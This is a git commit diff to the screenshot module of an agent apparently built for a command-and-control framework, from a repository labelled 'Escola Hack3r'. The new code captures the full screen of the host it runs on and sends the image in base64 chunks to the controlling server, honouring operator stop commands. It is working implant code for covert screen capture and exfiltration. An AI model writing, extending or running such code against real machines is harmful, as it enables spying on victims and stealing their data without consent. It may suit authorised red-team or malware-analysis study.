829d93cfa61f070993987709fbe3e4d1942564bb
Willian Oliveira - Escola Hack3r <71089186+wtechsec@users.noreply.github.com>
2025-08-26 09:20:49 -0300

    Update screenshot2.py

--- Payload_Type/anubis/anubis/agent_code/screenshot2.py
+++ Payload_Type/anubis/anubis/agent_code/screenshot2.py
@@ -1,13 +1,53 @@
-    def screenshot2(self, task_id, input):
-        try:
-            import io, base64
-            from PIL import ImageGrab
+def screenshot(self, task_id):
+    import io, base64, json
+    from datetime import datetime
+    from PIL import ImageGrab  # funciona no Windows
 
-            img = ImageGrab.grab()
-            buffer = io.BytesIO()
-            img.save(buffer, format="PNG")
-            data = base64.b64encode(buffer.getvalue()).decode()
+    # captura a tela inteira
+    img = ImageGrab.grab()
+    buf = io.BytesIO()
+    img.save(buf, format="PNG")
+    sh_data = buf.getvalue()
+    file_size = len(sh_data)
 
-            return f"[+] Screenshot capturado\n{data}"
-        except Exception as e:
-            return f"[!] Erro: {str(e)}"
+    if file_size > 0:
+        total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)
+        data = {
+            "action": "post_response", 
+            "responses": [
+                {
+                    "task_id": task_id,
+                    "total_chunks": total_chunks,
+                    "file_path": str(datetime.now()),
+                    "chunk_size": CHUNK_SIZE,
+                    "is_screenshot": True 
+                }
+            ]
+        }
+        initial_response = self.postMessageAndRetrieveResponse(data)
+
+        for i in range(0, total_chunks):
+            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
+                return "Job stopped."
+
+            if i == total_chunks - 1:
+                content = sh_data[i*CHUNK_SIZE:]
+            else:
+                content = sh_data[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]
+
+            data = {
+                "action": "post_response", 
+                "responses": [
+                    {
+                        "chunk_num": i+1,
+                        "file_id": initial_response["responses"][0]["file_id"],
+                        "chunk_data": base64.b64encode(content).decode(),
+                        "task_id": task_id                        
+                    }
+                ]
+            }
+            self.postMessageAndRetrieveResponse(data)
+
+        return json.dumps({ "file_id": initial_response["responses"][0]["file_id"] })
+    else:
+        return json.dumps({ "error": "Failed to capture screenshot" })
